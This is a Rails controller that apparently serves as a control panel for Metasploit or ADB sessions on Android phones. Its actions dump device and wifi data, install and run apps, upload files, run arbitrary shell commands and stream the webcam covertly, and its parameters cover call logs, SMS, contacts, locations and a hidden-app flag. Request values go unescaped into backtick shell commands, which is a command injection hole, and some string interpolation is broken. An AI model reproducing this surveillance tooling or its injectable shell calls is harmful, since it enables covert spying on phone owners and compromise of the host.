
class SmartphonesController < InheritedResources::Base
  @@isWebcamRecordOn=false

  def dump_sysinfo
    processCommand="sysinfo"
    commandOutput=start_msf_process(processCommand)
    puts commandOutput

    respond_to do |format|
        format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
      end
    end

    def dump_localtime
      processCommand="localtime"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def set_audio_mode
      processCommand="set_audio_mode -m #{params[:sound_mode]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "set_audio_mode", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def uninstall_app
      if @@isAdbConnected
        commandOutput=`tools\\platform-tools\\adb.exe uninstall #{params[:app_name]}`
      else
        processCommand="app_uninstall #{params[:app_name]}"
        commandOutput=start_msf_process(processCommand)
        puts commandOutput
    end
    respond_to do |format|
        format.js { render "uninstall_app", :locals => {:commandOutput => commandOutput}  }
      end
    end

    def install_app
      if @@isAdbConnected
          commandOutput=`tools\\platform-tools\\adb.exe install #{params[:app_name]}`
      else
          processCommand="app_install #{params[:app_name]}"
          commandOutput=start_msf_process(processCommand)
          puts commandOutput
      end
      respond_to do |format|
          format.js { render "install_app", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def list_apps
      if @@isAdbConnected
        commandOutput=`tools\\platform-tools\\adb.exe shell pm list packages`
    else
        processCommand="app_list -#{params[:apps_type]}"
        commandOutput=start_msf_process(processCommand)
        puts commandOutput
    end


      respond_to do |format|
          format.js { render "list_apps", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def open_app
      processCommand="app_run #{params[:app_name]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "open_app", :locals => {:commandOutput => commandOutput}  }
        end
    end


    def wake_lock
      processCommand="wakelock #{params[:flag]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "wake_lock", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def dump_wifi_info
      if @@isAdbConnected
          commandOutput=`tools\\platform-tools\\adb.exe shell "dumpsys wifi | grep SSID: | grep -v rt="`
      else
          start_msf_process("shell")
          processCommand='shell "dumpsys wifi | grep SSID: | grep -v rt="'
          commandOutput=start_msf_process(processCommand)
          detach_session
      end
          respond_to do |format|
          format.js { render "dump_wifi_info", :locals => {:commandOutput => commandOutput.split('\n')}  }
        end
    end

    def upload_file
      if @@isAdbConnected
          commandOutput=`tools\\platform-tools\\adb.exe push #{params[:filePath]} /sdcard/`
      else
          processCommand='upload #{params[:filePath]}'
          commandOutput=start_msf_process(processCommand)
      end
          respond_to do |format|
          format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
        end
    end


    def run_shell_command
      if @@isAdbConnected
          commandOutput=`tools\\platform-tools\\adb.exe shell #{params[:shellCommand]}`
      else
          start_msf_process("shell")
          processCommand='#{params[:shellCommand]}'
          commandOutput=start_msf_process(processCommand)
          detach_session
      end
          respond_to do |format|
          format.js { render "run_shell_command", :locals => {:commandOutput => commandOutput.split('\n')}  }
        end
    end




    def webcam_record
      commandOutput=[]
      fileName="None"
      if !@@isWebcamRecordOn
          commandTimeout=20
          currentTime = DateTime.now
          currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
          @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
          @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
          #remove quality
          processCommand="webcam_stream -v false -i 1 -s #{@fileNameJpeg} -t #{@fileNameHtml}"
          commandOutput=start_msf_process(processCommand)
          puts commandOutput

          isOperationSuccessful=false
          1.upto(commandTimeout) do |n|
              if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
                isOperationSuccessful = true
                @@isWebcamRecordOn = true
                sleep 5
                break
              else
                  puts "Waiting ..."
              end
              sleep 1
            end

          commandOutput=["Operation Failed"] if not isOperationSuccessful
      else
          commandOutput.append('Control+Z')
          commandOutput.append(detach_session)
          @@isWebcamRecordOn = false
      end



      respond_to do |format|
          format.js { render "webcam_record", :locals => {:commandOutput => commandOutput, :fileName => @fileNameHtml}  }
        end
  end



    


    


    def dropdown_list_smartphones
        render locals: {smartphones: smartphones, smartphone:smartphone}
      end

    def select_smartphone
        redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: params[:smartphone_id]
    end


    def load
        render
    end

    def install
        path = "installsomething.txt"
        content = "data from the form"
        File.open(path, "w+") do |f|
        f.write(content)
        end
    end





    

  private

    def smartphone_params
      params.require(:smartphone).permit(:operating_system, :name, :pictures, :screenshots, :videos, :recordings, :is_rooted, :call_logs, :contacts, :sms_messages, :geo_locations, :is_app_hidden)
    end





end
